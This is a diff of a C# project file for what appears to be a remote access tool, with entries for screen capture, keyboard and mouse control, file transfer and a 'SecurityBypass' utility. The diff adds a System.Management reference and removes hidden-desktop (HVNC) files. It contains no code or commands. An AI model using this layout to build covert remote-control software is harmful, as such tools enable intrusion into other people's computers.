@@ -102,6 +102,7 @@
       <RequiredTargetFramework>3.5</RequiredTargetFramework>
     </Reference>
     <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
     <Reference Include="System.Windows.Forms" />
   </ItemGroup>
   <ItemGroup>
@@ -112,7 +113,6 @@
     <Compile Include="Handlers\RequestCaptureScreenHandler.cs" />
     <Compile Include="Handlers\RequestMouseEventHandler.cs" />
     <Compile Include="Handlers\RequestKeyboardEventHandler.cs" />
-    <Compile Include="Handlers\RequestHVNCHandler.cs" />
     <Compile Include="Handlers\RequestDownloadHandler.cs" />
     <Compile Include="Handlers\RequestOpenFileHandler.cs" />
     <Compile Include="Handlers\RequestUploadHandler.cs" />
@@ -124,7 +124,6 @@
     <Compile Include="Utils\SecurityBypass.cs" />
     <Compile Include="Utils\MouseOpeUtil.cs" />
     <Compile Include="Utils\KeyboardOpeUtil.cs" />
-    <Compile Include="Utils\HVNCDesktop.cs" />
   </ItemGroup>
   <ItemGroup>
     <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
